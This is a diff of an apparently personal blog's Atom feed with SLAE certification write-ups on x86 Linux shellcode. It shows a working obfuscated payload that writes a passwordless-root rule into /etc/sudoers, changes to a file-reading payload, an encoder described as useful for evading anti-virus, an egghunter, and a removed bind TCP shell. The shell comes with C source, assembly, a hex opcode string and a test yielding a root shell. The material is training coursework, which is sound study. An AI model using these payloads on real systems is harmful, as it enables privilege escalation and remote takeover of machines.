+   0x00402040 &lt;+0&gt;:     push   esp
+   0x00402041 &lt;+1&gt;:     pop    ebp
+   0x00402042 &lt;+2&gt;:     xor    eax,eax
+   0x00402044 &lt;+4&gt;:     cdq
+   0x00402045 &lt;+5&gt;:     push   0xcafebabe
+   0x0040204a &lt;+10&gt;:    push   edx
+   0x0040204b &lt;+11&gt;:    push   0xb98cdfd1
+   0x00402050 &lt;+16&gt;:    push   0x17071640
+   0x00402055 &lt;+21&gt;:    movd   mm0,DWORD PTR [ebp-0x4]
+   0x00402059 &lt;+25&gt;:    pxor   mm0,QWORD PTR [ebp-0xc]
+   0x0040205d &lt;+29&gt;:    movd   DWORD PTR [ebp-0xc],mm0
+   0x00402061 &lt;+33&gt;:    pxor   mm0,QWORD PTR [ebp-0x10]
+   0x00402065 &lt;+37&gt;:    movd   DWORD PTR [ebp-0x10],mm0
+   0x00402069 &lt;+41&gt;:    emms
+   0x0040206b &lt;+43&gt;:    push   0x6374652e
+   0x00402070 &lt;+48&gt;:    mov    ebx,esp
+   0x00402072 &lt;+50&gt;:    inc    BYTE PTR [ebx]
+   0x00402074 &lt;+52&gt;:    push   0x20
+   0x00402076 &lt;+54&gt;:    fild   DWORD PTR [esp]
+   0x00402079 &lt;+57&gt;:    fmul   st,st(0)
+   0x0040207b &lt;+59&gt;:    fist   DWORD PTR [esp]
+   0x0040207e &lt;+62&gt;:    pop    ecx
+   0x0040207f &lt;+63&gt;:    inc    ecx
+=&gt; 0x00402080 &lt;+64&gt;:    or     al,0x5
+   0x00402082 &lt;+66&gt;:    int    0x80
+   0x00402084 &lt;+68&gt;:    xchg   ebx,eax
+   0x00402085 &lt;+69&gt;:    push   edx
+   0x00402086 &lt;+70&gt;:    push   0xa4c4c41
+   0x0040208b &lt;+75&gt;:    push   0x203a4457
+   0x00402090 &lt;+80&gt;:    push   0x53534150
+   0x00402095 &lt;+85&gt;:    push   0x4f4e2029
+   0x0040209a &lt;+90&gt;:    push   0x4c4c4128
+   0x0040209f &lt;+95&gt;:    push   0x3d4c4c41
+   0x004020a4 &lt;+100&gt;:   push   0x204c4c41
+   0x004020a9 &lt;+105&gt;:   mov    ecx,esp
+   0x004020ab &lt;+107&gt;:   or     dl,0x1c
+   0x004020ae &lt;+110&gt;:   push   0x2
+   0x004020b0 &lt;+112&gt;:   movss  xmm0,DWORD PTR [esp]
+   0x004020b5 &lt;+117&gt;:   addss  xmm0,DWORD PTR [esp]
+---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---
+   0x004020ba &lt;+122&gt;:   movd   eax,xmm0
+   0x004020be &lt;+126&gt;:   int    0x80
+   0x004020c0 &lt;+128&gt;:   add    BYTE PTR [eax],al
+End of assembler dump.
+$33 = [ IF ]
+
+Breakpoint 5, 0x00402080 in shellcode ()
+(gdb) i r ecx
+ecx            0x401    1025
+</code></pre>
+
+<p>Executing the shellcode correctly appends the entry to the /etc/sudoers file:</p>
+
+<pre><code class="bash"># tail -n1 /etc/sudoers; strace -e open,write ./shellcode; tail -n1 /etc/sudoers
+#includedir /etc/sudoers.d
+open("/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
+open("/lib/i386-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
+write(1, "Shellcode length: 128\n", 22Shellcode length: 128
+) = 22
+open("/etc/sudoers", O_WRONLY|O_APPEND) = 3
+write(3, "ALL ALL=(ALL) NOPASSWD: ALL\n", 28) = 28
+--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x1c} ---
++++ killed by SIGSEGV +++
+Segmentation fault
+ALL ALL=(ALL) NOPASSWD: ALL
+</code></pre>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[SLAE 0x05: Metasploit Payloads]]></title>
@@ -625,7 +1373,7 @@ uid=0(root) gid=0(root) groups=0(root)
 
 <h3>3. linux/x86/read_file</h3>
 
-<p>The final shellcode reads the configured file and writes its contents to a specific file descriptor. Since the above skeleton C program will be used, the contents are going to be written to the remote client over the network on descriptor 4:</p>
+<p>The final shellcode reads the configured file and writes its contents to a specific file descriptor. Since the above skeleton C program will be used, the contents are going to be written to the remote client over the network on descriptor 4. Since it needs to obtain the absolute address in memory of the path to open, it is using the well known JMP/CALL/POP technique to avoid having 0x00 characters in the resulting shellcode:</p>
 
 <pre><code class="asm">global _start
 
@@ -681,40 +1429,6 @@ $ asm-syscall exit
 
 <p>By making use of the listening skeleton server as before, the contents of the /proc/version file are echoed back to the remote client:</p>
 
-<pre><code class="bash dissecting jmp/call/pop">Dump of assembler code for function shellcode:
-   0x00402080 &lt;+0&gt;:     jmp    0x4020b8 &lt;shellcode+56&gt;
-   0x00402082 &lt;+2&gt;:     mov    eax,0x5
-   0x00402087 &lt;+7&gt;:     pop    ebx
-=&gt; 0x00402088 &lt;+8&gt;:     xor    ecx,ecx
-   0x0040208a &lt;+10&gt;:    int    0x80
-   0x0040208c &lt;+12&gt;:    mov    ebx,eax
-   0x0040208e &lt;+14&gt;:    mov    eax,0x3
-   0x00402093 &lt;+19&gt;:    mov    edi,esp
-   0x00402095 &lt;+21&gt;:    mov    ecx,edi
-   0x00402097 &lt;+23&gt;:    mov    edx,0x1000
-   0x0040209c &lt;+28&gt;:    int    0x80
-   0x0040209e &lt;+30&gt;:    mov    edx,eax
-   0x004020a0 &lt;+32&gt;:    mov    eax,0x4
-   0x004020a5 &lt;+37&gt;:    mov    ebx,0x4
-   0x004020aa &lt;+42&gt;:    int    0x80
-   0x004020ac &lt;+44&gt;:    mov    eax,0x1
-   0x004020b1 &lt;+49&gt;:    mov    ebx,0x0
-   0x004020b6 &lt;+54&gt;:    int    0x80
-   0x004020b8 &lt;+56&gt;:    call   0x402082 &lt;shellcode+2&gt;
-   0x004020bd &lt;+61&gt;:    das
-   0x004020be &lt;+62&gt;:    jo     0x402132
-   0x004020c0 &lt;+64&gt;:    outs   dx,DWORD PTR ds:[esi]
-   0x004020c1 &lt;+65&gt;:    arpl   WORD PTR [edi],bp
-   0x004020c3 &lt;+67&gt;:    jbe    0x40212a
-   0x004020c5 &lt;+69&gt;:    jb     0x40213a
-   0x004020c7 &lt;+71&gt;:    imul   ebp,DWORD PTR [edi+0x6e],0x0
-End of assembler dump.
-$5 = [ SF IF ]
-0x00402088 in shellcode ()
-(gdb) x/s $ebx
-0x4020bd &lt;shellcode+61&gt;:        "/proc/version"
-</code></pre>
-
 <pre><code class="bash"># ./shellcode 4242
 Connection from 127.0.0.1:47624
 $ nc -v 127.0.0.1 4242
@@ -736,7 +1450,7 @@ http://securitytube-training.com/online-courses/securitytube-linux-assembly-expe
 Student-ID: SLAE-1154
 </code></pre>
 
-<p>This one details the use of an encoding scheme to encode the shellcode with and decode it subsequently on runtime.</p>
+<p>This one details the use of an encoding scheme to encode the shellcode with and decode it subsequently on runtime, which is rather handy to evade anti-virus engines.</p>
 
 <p>I&rsquo;ve decided to use <a href="http://www.yenc.org/yenc-draft.1.3.txt">YEnc</a> (draft 1.3). YEnc is used to encode binary data to be transmitted by email or newsgroups and uses the complete 8-bit character set, thus making its output only 1-2% larger than the original.</p>
 
@@ -1175,7 +1889,7 @@ egg_check:
     jmp edi                 ; edi points to the shellcode to execute
 </code></pre>
 
-<p>To run the shellcode, like before, the configure command should be issued first, followed by make. The second stage payload can be specified by the STAGE2 variable:</p>
+<p>To run the shellcode, like before, the configure command should be issued first, followed by make. The second stage payload can be specified by the <strong>STAGE2</strong> variable:</p>
 
 <pre><code class="bash">$ ./configure
 Using listening port: 0x9210
@@ -1208,7 +1922,7 @@ ld -N -zexecstack -o egghunter egghunter.o
  804807f:       ff e7                   jmp    edi
 Shellcode size: 33
 \xfc\x31\xdb\x6a\x28\x58\x43\xcd\x80\x3c\xf2\x75\x07\x66\x81\xcb\xff\x0f\xeb\xef\xb8\xbd\xba\xfe\xca\x40\x89\xdf\xaf\x75\xe4\xff\xe7
-cc -DEGGHUNTER=`asm-opcodes egghunter` -DSHELLCODE=`asm-opcodes ../0x02-reverse/reverse` -W -Wall -fno-stack-protector -zexecstack -o shellcode skel.c
+cc -DSHELLCODE=`asm-opcodes egghunter` -DSTAGE2=`asm-opcodes ../0x01-bind/bind` -W -Wall -fno-stack-protector -zexecstack -o shellcode skel.c
 </code></pre>
 
 <pre><code class="bash">$ nc -lv 127.1.1.1 4242
@@ -1218,7 +1932,7 @@ id
 uid=0(root) gid=0(root) groups=0(root)
 # ./shellcode
 Egghunter length: 33
-Shellcode length: 74
+Second stage length: 70
 </code></pre>
 ]]></content>
   </entry>
@@ -1515,643 +2229,6 @@ dup2(3, 2)                              = 2
 dup2(3, 1)                              = 1
 dup2(3, 0)                              = 0
 execve("//bin/sh", NULL, NULL)          = 0
-</code></pre>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[SLAE 0x01: Bind TCP Shell]]></title>
-    <link href="http://tcunha.github.io/blog/2018/05/20/slae-0x01-bind-tcp-shell/"/>
-    <updated>2018-05-20T21:51:39+00:00</updated>
-    <id>http://tcunha.github.io/blog/2018/05/20/slae-0x01-bind-tcp-shell</id>
-    <content type="html"><![CDATA[<pre><code>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
-
-http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert
-
-Student-ID: SLAE-1154
-</code></pre>
-
-<p>In contrast with the shellcodes in shell-storm.org and exploit-db.com, this one is using the well known socket functions. According to <a href="http://man7.org/linux/man-pages/man2/socketcall.2.html">socketcall(2)</a> these are also available as system calls since Linux version 4.3.</p>
-
-<p>I&rsquo;ve also decided not to call <a href="http://man7.org/linux/man-pages/man2/setsockopt.2.html">setsockopt(2)</a> to reuse the port and relied on some implementation-specific behaviour to keep the shellcode smaller.</p>
-
-<p>To perform a network I/O operation a process needs to first call <a href="http://man7.org/linux/man-pages/man2/socket.2.html">socket(2)</a> by specifying the desired protocol and to obtain a file descriptor:</p>
-
-<pre><code class="c socket(2) prototype">int socket(int domain, int type, int protocol);
-</code></pre>
-
-<p>The domain (also known as family) is implementation-defined, but most of the time it is one of:</p>
-
-<pre><code>+----------+-------------+
-|  domain  | description |
-+----------+-------------+
-| AF_INET  | IPv4        |
-| AF_INET6 | IPv6        |
-| AF_LOCAL | Unix domain |
-+----------+-------------+
-</code></pre>
-
-<p>The type specifies the semantics of the communication:</p>
-
-<pre><code>+-------------+-----------------+
-|    type     |   description   |
-+-------------+-----------------+
-| SOCK_STREAM | Stream socket   |
-| SOCK_DGRAM  | Datagram socket |
-+-------------+-----------------+
-</code></pre>
-
-<p>The protocol can be set to zero to select the default one for the combination of domain and type:</p>
-
-<pre><code>+--------------+-----------------+
-|   protocol   |   description   |
-+--------------+-----------------+
-| IPPROTO_TCP  | TCP transport   |
-| IPPROTO_UDP  | UDP transport   |
-| IPPROTO_SCTP | SCTP transport  |
-+--------------+-----------------+
-</code></pre>
-
-<pre><code class="bash retrieving the system call number and constants">$ asm-syscall socket
-#define __NR_socket 359
-0x167
-$ python -c 'import socket; print socket.AF_INET; print socket.SOCK_STREAM'
-2
-1
-</code></pre>
-
-<p>With this in mind the registers will contain the following before and after the system call:</p>
-
-<pre><code>+----------+-------+
-| register | value |
-+----------+-------+
-| eax      | 359   |
-| ebx      | 2     |
-| ecx      | 1     |
-| edx      | 0     |
-+----------+-------+
-| return   | fd    |
-+----------+-------+
-</code></pre>
-
-<p>The bind shell will use the AF_INET family with a SOCK_STREAM type. Beware that not all combinations of family and type are valid. Then, one needs to use <a href="http://man7.org/linux/man-pages/man2/bind.2.html">bind(2)</a> to assign a local protocol address to the socket:</p>
-
-<pre><code class="c bind(2) prototype">int bind(int sockfd, const struct sockaddr *addr, socklen_t addr_len);
-</code></pre>
-
-<p>The socket address structure, in this case, has to be manually packed and will be IPv4 specific. Nowadays, one should use <a href="http://man7.org/linux/man-pages/man3/getaddrinfo.3.html">getaddrinfo(3)</a> and sockaddr_storage which is large enough for any socket structure, instead:</p>
-
-<pre><code class="c">#include &lt;sys/types.h&gt;
-#include &lt;sys/socket.h&gt;
-
-#include &lt;err.h&gt;
-#include &lt;netdb.h&gt;
-#include &lt;stdio.h&gt;
-#include &lt;string.h&gt;
-#include &lt;unistd.h&gt;
-
-int
-bind_try(struct addrinfo *p)
-{
-    int fd, yes = 1;
-
-    if ((fd = socket(p-&gt;ai_family, p-&gt;ai_socktype, p-&gt;ai_protocol)) == -1) {
-        warn("socket");
-        return (-1);
-    }
-    if (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &amp;yes, sizeof yes) == -1)
-        err(1, "setsockopt");
-    if (bind(fd, p-&gt;ai_addr, p-&gt;ai_addrlen) == -1) {
-        close(fd);
-        warn("bind");
-        return (-1);
-    }
-
-    return (fd);
-}
-
-int
-main(int argc, char **argv)
-{
-    char                    *exec_argv[] = { "/bin/sh", NULL };
-    int                      ai_ret, fd, fd_client;
-    socklen_t                sl_client;
-    struct addrinfo          ai_hints;
-    struct addrinfo         *ai_ptr, *ai_srv;
-    struct sockaddr_storage  sa_client;
-
-    if (argc != 2)
-        errx(1, "usage: port");
-
-    memset(&amp;ai_hints, 0, sizeof ai_hints);
-    ai_hints.ai_family = AF_UNSPEC;
-    ai_hints.ai_socktype = SOCK_STREAM;
-    ai_hints.ai_flags = AI_PASSIVE;
-
-    if ((ai_ret = getaddrinfo(NULL, argv[1], &amp;ai_hints, &amp;ai_srv)) != 0)
-        errx(1, "getaddrinfo: %s", gai_strerror(ai_ret));
-    for (ai_ptr = ai_srv; ai_ptr != NULL; ai_ptr = ai_ptr-&gt;ai_next) {
-        if ((fd = bind_try(ai_ptr)) != -1)
-            break;
-    }
-    if (ai_ptr == NULL)
-        errx(1, "failed to bind");
-    freeaddrinfo(ai_srv);
-    sl_client = sizeof sa_client; 
-
-    if (listen(fd, 5) == 1)
-        err(1, "listen");
-    fd_client = accept(fd, (struct sockaddr *) &amp;sa_client, &amp;sl_client);
-    if (fd_client == -1)
-        err(1, "accept");
-
-    if (dup2(fd_client, STDIN_FILENO) == -1)
-        err(1, "dup2");
-    if (dup2(fd_client, STDOUT_FILENO) == -1)
-        err(1, "dup2");
-    if (dup2(fd_client, STDERR_FILENO) == -1)
-        err(1, "dup2");
-
-    execve(exec_argv[0], exec_argv, NULL);
-    err(1, "execve");
-
-    return (0); /* NOTREACHED */
-}
-</code></pre>
-
-<p>Per the UNP book, it isn&rsquo;t mandatory to choose a port nor an address to bind to. In that case, the kernel picks an ephemeral port and uses the destination IP address of the client&rsquo;s SYN as the server&rsquo;s source IP address.</p>
-
-<pre><code class="c IPv4 socket structure">struct in_addr {
-    in_addr_t s_addr;        /* 32-bit IPv4 address */
-}; /* used to be a union on 4.2BSD */
-
-struct sockaddr_in {
-    sa_family_t sin_family;  /* 16-bit family (AF_INET) */
-    in_port_t sin_port;      /* 16-bit port number */
-    struct in_addr sin_addr; /* 32-bit address */
-    char sin_zero[8];        /* unused */
-};
-</code></pre>
-
-<pre><code class="c generic socket structure">struct sockaddr {
-    unsigned short sa_family; /* address family, AF_xxx */
-    char sa_data[14];         /* 14 bytes of protocol address */
-}; 
-</code></pre>
-
-<p>According to <a href="http://www.kohala.com/start/">Stevens</a>, the sin_zero member was added so that all socket address structures are at least 16 bytes in size and isn&rsquo;t really required when it is going to be used with the wildcard address.</p>
-
-<p>The socket structures are casted to the generic socket address structure, due to the functions having to deal with a multitude of protocol families (IPv4, IPv6, Unix and datalink, for instance). One could have used void from ANSI C instead of the generic structure, however that was non-existent back in 1982.</p>
-
-<pre><code class="c IPv6 socket structure">struct in6_addr {
-    uint8_t s6_addr[16];       /* 128-bit IPv6 address */
-};
-
-struct sockaddr_in6 {
-    sa_family_t sin6_family;   /* 16-bit family (AF_INET6) */
-    in_port_t sin6_port;       /* 16-bit port number */
-    uint32_t sin6_flowinfo;    /* 32-bit flow information */
-    struct in6_addr sin6_addr; /* 128-bit address */
-    uint32_t sin6_scope_id;    /* 32-bit scope ID */
-};
-</code></pre>
-
-<p>The important part here is that the family struct members match, so that it can be freely accessed when casted to the generic socket structure.</p>
-
-<pre><code class="bash retrieving the system call number and constants">$ asm-syscall bind
-#define __NR_bind 361
-0x169
-$ python -c 'import socket; print socket.INADDR_ANY'
-0
-</code></pre>
-
-<pre><code>+----------+--------------------+
-| register |       value        |
-+----------+--------------------+
-| eax      | 361                |      +---------------------------+ H
-| ebx      | socket(2) fd       |      | INADDR_ANY (0)            |
-| ecx      | esp pointer        +--&gt;&gt;--+ port (network byte order) |
-| edx      | 16                 |      | AF_INET (2)               |
-+----------+--------------------+      +---------------------------+ L
-</code></pre>
-
-<p>This is the point where <a href="http://man7.org/linux/man-pages/man2/setsockopt.2.html">setsockopt(2)</a> could be used to prevent the address is already in use error, which might occur if there are still previously established connections lying around.</p>
-
-<p>For the <a href="http://man7.org/linux/man-pages/man2/listen.2.html">listen(2)</a> system call, according to <a href="http://pubs.opengroup.org/onlinepubs/9699919799/">SUSv4</a> a backlog argument of 0 may allow the socket to accept connections, in which case the length of the listen queue may be set to an implementation-defined minimum value. This works if SYN cookies are <a href="https://access.redhat.com/solutions/30453">enabled</a>, which is usually the case with recent versions.</p>
-
-<pre><code class="c listen(2) prototype">int listen(int sockfd, int backlog);
-</code></pre>
-
-<pre><code class="bash retrieving the system call number">$ asm-syscall listen
-#define __NR_listen 363
-0x16b
-</code></pre>
-
-<pre><code>+----------+---------------+
-| register |     value     |
-+----------+---------------+
-| eax      | 363           |
-| ebx      | socket(2) fd  |
-| ecx      | 0             |
-+----------+---------------+
-</code></pre>
-
-<p>Next and finally in the flow is the <a href="http://man7.org/linux/man-pages/man2/accept.2.html">accept4(2)</a> call which is used to return a completed connection from the queue, if any. On success the return value is a new file descriptor created by the kernel to be used with the recently established connection:</p>
-
-<pre><code class="c accept4(2) prototype">int accept4(int sockfd, struct sockaddr *addr, socklen_t *addrlen, int flags);
-</code></pre>
-
-<p>The second and third arguments are used by the kernel to fill the address structure of the newly connected peer. According to the manual page these aren&rsquo;t really needed and can be both NULL.</p>
-
-<pre><code>+----------+---------------+
-| register |     value     |
-+----------+---------------+
-| eax      | 364           |
-| ebx      | socket(2) fd  |
-| ecx      | 0             |
-| edx      | 0             |
-| esi      | 0             |
-+----------+---------------+
-| return   | new fd        |
-+----------+---------------+
-</code></pre>
-
-<p>For the <a href="http://man7.org/linux/man-pages/man2/execve.2.html">execve(2)</a> system call there&rsquo;s no need to specify argv and envp, since according to the manual page on Linux, argv and envp can be specified as NULL. This is obviously <a href="http://pubs.opengroup.org/onlinepubs/9699919799/">non-standard</a> and might result in an error on other systems.</p>
-
-<pre><code class="c execve(2) prototype">int execve(const char *filename, char *const argv[], char *const envp[]);
-</code></pre>
-
-<pre><code class="bash retrieving the system call number">$ asm-syscall execve
-#define __NR_execve 11
-0xb
-</code></pre>
-
-<pre><code>+----------+-------------+
-| register |    value    |
-+----------+-------------+
-| eax      | 11          |      +-----------+
-| ebx      | esp pointer +--&gt;&gt;--+ /bin/sh\0 |
-| ecx      | 0           |      +-----------+
-| edx      | 0           |
-+----------+-------------+
-</code></pre>
-
-<pre><code class="bash converting path to hex and little endian">$ asm-string /bin/sh
-Adding 1 slashes!
-Original string: /bin/sh (7)
-Modified string: //bin/sh (8)
-0x68732f6e
-0x69622f2f
-</code></pre>
-
-<pre><code class="asm initial execve(2) shellcode">; Regular execve(2) /bin/sh shellcode that tries to save as much space possible
-; and follow the specification.
-
-global _start
-
-section .text
-_start:
-    xor eax, eax
-
-    push eax
-    mov edx, esp    ; envp
-    push 0x68732f6e ; n/sh
-    push 0x69622f2f ; //bi
-    mov ebx, esp    ; filename
-
-    push eax
-    push ebx
-    mov ecx, esp    ; argv
-
-    mov al, 0xb
-    int 0x80
-</code></pre>
-
-<pre><code class="bash">$ asm-opcodes execve
-Shellcode size: 25
-\x31\xc0\x50\x89\xe2\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
-$ strace ./execve    
-execve("./execve", ["./execve"], [/* 19 vars */]) = 0    
-execve("//bin/sh", ["//bin/sh"], [/* 0 vars */]) = 0
-</code></pre>
-
-<p>Not specifying those arguments allows saving 4 bytes:</p>
-
-<pre><code class="asm second version of execve(2) shellcode">; Save space by making the second argument to execve(2) empty. This doesn't
-; strictly follow POSIX or SUS.
-
-global _start
-
-section .text
-_start:
-    xor ecx, ecx    ; argv
-    mul ecx         ; makes eax and edx (envp) zero
-
-    push eax
-    push 0x68732f6e ; n/sh
-    push 0x69622f2f ; //bi
-    mov ebx, esp    ; filename
-
-    mov al, 0xb
-    int 0x80
-</code></pre>
-
-<pre><code class="bash">$ asm-opcodes execve
-Shellcode size: 21
-\x31\xc9\xf7\xe1\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80
-$ strace ./execve
-execve("./execve", ["./execve"], [/* 19 vars */]) = 0
-execve("//bin/sh", NULL, NULL)
-</code></pre>
-
-<p>The standard input, output and error file descriptors need to be redirected with <a href="http://man7.org/linux/man-pages/man2/dup.2.html">dup2(2)</a> beforehand to the recently <a href="http://man7.org/linux/man-pages/man2/accept.2.html">accept4(2)</a> file descriptor in order to have interaction with the created shell.</p>
-
-<pre><code class="c dup2(2) prototype">int dup2(int fildes, int fildes2);
-</code></pre>
-
-<pre><code class="bash retrieving the system call number">$ asm-syscall dup2
-#define __NR_dup2 63
-0x3f
-</code></pre>
-
-<pre><code>+----------+---------------+
-| register |     value     |
-+----------+---------------+
-| eax      | 63            |
-| ebx      | accept4(2) fd |
-| ecx      | 2, 1, 0       |
-+----------+---------------+
-| return   | 2, 1, 0       |
-+----------+---------------+
-</code></pre>
-
-<p>In C, overall, this roughly translates to:</p>
-
-<pre><code class="c">#include &lt;sys/types.h&gt;
-#include &lt;sys/socket.h&gt;
-
-#include &lt;arpa/inet.h&gt;
-
-#include &lt;err.h&gt;
-#include &lt;errno.h&gt;
-#include &lt;limits.h&gt;
-#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;strings.h&gt;
-#include &lt;unistd.h&gt;
-
-int
-main(int argc, char **argv)
-{
-    char                    *exec_argv[] = { "/bin/sh", NULL };
-    char                    *endptr;
-    int                      fd, fd_client, yes = 1;
-    long                     port;
-    socklen_t                sl_client;
-    struct sockaddr_in       sa;
-    struct sockaddr_storage  sa_client;
-
-    if (argc == 1)
-        errx(1, "usage: port");
-
-    errno = 0;
-    port = strtol(argv[1], &amp;endptr, 10);
-    if (*endptr != '\0')
-        errx(1, "not a number");
-    if (errno == ERANGE || (port &lt;= 1024 || port &gt;= 65536))
-        errx(1, "port out of range");
-
-    if ((fd = socket(PF_INET, SOCK_STREAM, 0)) == -1)
-        err(1, "socket");
-
-    bzero(&amp;sa, sizeof sa);
-    sa.sin_family = AF_INET;
-    sa.sin_addr.s_addr = htonl(INADDR_ANY);
-    sa.sin_port = htons(port);
-
-    if (bind(fd, (struct sockaddr *) &amp;sa, sizeof sa) == -1)
-        err(1, "bind");
-    if (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &amp;yes, sizeof yes) == -1)
-        err(1, "setsockopt");
-    if (listen(fd, 5) == -1)
-        err(1, "listen");
-
-    sl_client = sizeof sa_client; 
-    fd_client = accept(fd, (struct sockaddr *) &amp;sa_client, &amp;sl_client);
-    if (fd_client == -1)
-        err(1, "accept");
-
-    if (dup2(fd_client, STDIN_FILENO) == -1)
-        err(1, "dup2");
-    if (dup2(fd_client, STDOUT_FILENO) == -1)
-        err(1, "dup2");
-    if (dup2(fd_client, STDERR_FILENO) == -1)
-        err(1, "dup2");
-
-    execve(exec_argv[0], exec_argv, NULL);
-    err(1, "execve");
-
-    return (0); /* NOTREACHED */
-}
-</code></pre>
-
-<p>And, finally, the commented shellcode:</p>
-
-<pre><code class="asm">global _start
-
-section .text
-_start:
-    xor eax, eax
-    xor esi, esi            ; will always hold the value 0
-    cdq                     ; set edx to zero as well, by sign extending eax
-
-    mov ax, 0x167           ; use mov instead of push imm16 and pop r16
-    ; int socket(int, int, int)
-    push 0x2                ; PF_INET
-    pop ebx                 ; domain
-    push 0x1                ; SOCK_STREAM
-    pop ecx                 ; type
-    ; edx (protocol) initialized to zero by the cdq instruction above
-    int 0x80
-
-    xchg ebx, eax           ; fd on ebx from this point below
-    mov ax, 0x169           ; use mov instead of push imm16 and pop r16
-    ; int bind(int, const struct sockaddr *, socklen_t)
-    push esi                ; INADDR_ANY
-    push word PORT          ; port in network byte order
-    push word 0x2           ; AF_INET
-    mov ecx, esp            ; addr
-    push 0x10               ; 16 bytes in total
-    pop edx                 ; addrlen
-    int 0x80
-
-    mov ax, 0x16b           ; use mov instead of push imm16 and pop r16
-    ; int listen(int, int)
-    xor ecx, ecx            ; backlog
-    int 0x80
-
-    mul ecx                 ; set edx (addrlen) to zero
-    mov ax, 0x16c           ; use mov instead of push imm16 and pop r16
-    ; int accept4(int, struct sockaddr *, socklen_t *, int)
-    ; ecx (addr) is already zero from the above listen(2)
-    ; edx (addrlen) is already zero
-    ; esi (flags) is already zero
-    int 0x80
-
-    xchg ebx, eax           ; fd
-    inc ecx                 ; zero from the above listen(2)
-    inc ecx                 ; newfd
-bind_dup2_loop:
-    push 0x3f
-    ; int dup2(int, int)
-    pop eax 
-    int 0x80
-    dec ecx
-    jns bind_dup2_loop      ; don't jump if ecx is positive
-
-    push eax                ; eax is zero from the dup2(2) above (stdin fd)
-    mov al, 0xb
-    ; int execve(const char *, char *const [], char *const [])
-    push 0x68732f6e         ; n/sh
-    push 0x69622f2f         ; //bi
-    mov ebx, esp            ; filename
-    inc ecx                 ; ecx (argv) is 0xffffffff from the above dup(2)
-    ; edx is already zero from the above accept4(2)
-    int 0x80
-</code></pre>
-
-<p>Running the shellcode is only a matter of configuring the desired listening port with the optional -l command-line argument (4242/tcp by default) and running make. This process also ensures that it is \x00 free and automatically compiles the usual C file that executes the shellcode:</p>
-
-<pre><code class="bash">$ ./configure -l 1337
-Using remote host: 0x0101017f
-Using listening port: 0x3905
-Using remote port: 0x9210
-$ ./configure -l 1280
-Port contains NUL bytes!
-$ ./configure
-Using remote host: 0x0101017f
-Using listening port: 0x9210
-Using remote port: 0x9210
-$ cd 0x01-bind/
-$ make
-nasm  -f elf32 -o bind.o bind.asm
-ld -N -zexecstack -o bind bind.o
-08048060 &lt;_start&gt;:
- 8048060:       31 c0                   xor    eax,eax
- 8048062:       31 f6                   xor    esi,esi
- 8048064:       99                      cdq
- 8048065:       66 b8 67 01             mov    ax,0x167
- 8048069:       6a 02                   push   0x2
- 804806b:       5b                      pop    ebx
- 804806c:       6a 01                   push   0x1
- 804806e:       59                      pop    ecx
- 804806f:       cd 80                   int    0x80
- 8048071:       93                      xchg   ebx,eax
- 8048072:       66 b8 69 01             mov    ax,0x169
- 8048076:       56                      push   esi
- 8048077:       66 68 10 92             pushw  0x9210
- 804807b:       66 6a 02                pushw  0x2
- 804807e:       89 e1                   mov    ecx,esp
- 8048080:       6a 10                   push   0x10
- 8048082:       5a                      pop    edx
- 8048083:       cd 80                   int    0x80
- 8048085:       66 b8 6b 01             mov    ax,0x16b
- 8048089:       31 c9                   xor    ecx,ecx
- 804808b:       cd 80                   int    0x80
- 804808d:       f7 e1                   mul    ecx
- 804808f:       66 b8 6c 01             mov    ax,0x16c
- 8048093:       cd 80                   int    0x80
- 8048095:       93                      xchg   ebx,eax
- 8048096:       41                      inc    ecx
- 8048097:       41                      inc    ecx
-
-08048098 &lt;bind_dup2_loop&gt;:
- 8048098:       6a 3f                   push   0x3f
- 804809a:       58                      pop    eax
- 804809b:       cd 80                   int    0x80
- 804809d:       49                      dec    ecx
- 804809e:       79 f8                   jns    8048098 &lt;bind_dup2_loop&gt;
- 80480a0:       50                      push   eax
- 80480a1:       b0 0b                   mov    al,0xb
- 80480a3:       68 6e 2f 73 68          push   0x68732f6e
- 80480a8:       68 2f 2f 62 69          push   0x69622f2f
- 80480ad:       89 e3                   mov    ebx,esp
- 80480af:       41                      inc    ecx
- 80480b0:       cd 80                   int    0x80
-Shellcode size: 82
-\x31\xc0\x31\xf6\x99\x66\xb8\x67\x01\x6a\x02\x5b\x6a\x01\x59\xcd\x80\x93\x66\xb8\x69\x01\x56\x66\x68\x10\x92\x66\x6a\x02\x89\xe1\x6a\x10\x5a\xcd\x80\x66\xb8\x6b\x01\x31\xc9\xcd\x80\xf7\xe1\x66\xb8\x6c\x01\xcd\x80\x93\x41\x41\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x50\xb0\x0b\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x41\xcd\x80
-cc -DSHELLCODE=`asm-opcodes bind` -W -Wall -fno-stack-protector -zexecstack -o shellcode ../skel.c
-</code></pre>
-
-<pre><code class="bash"># ./shellcode
-Shellcode length: 82
-$ ss -nlt|grep 4242
-LISTEN     0      0            *:4242                     *:*
-$ nc -v 127.0.0.1 4242
-Connection to 127.0.0.1 4242 port [tcp/*] succeeded!
-id
-uid=0(root) gid=0(root) groups=0(root)
-</code></pre>
-
-<pre><code class="bash"># make strace
-$ head -n35 bind.strace
-execve("./shellcode", ["./shellcode"], [/* 23 vars */]) = 0
-write(1, "Shellcode length: 82\n", 21)  = 21
-socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3
-bind(3, {sa_family=AF_INET, sin_port=htons(4242), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
-listen(3, 0)                            = 0
-accept4(3, NULL, NULL, 0)               = 4
-dup2(4, 2)                              = 2
-dup2(4, 1)                              = 1
-dup2(4, 0)                              = 0
-execve("//bin/sh", NULL, NULL)          = 0
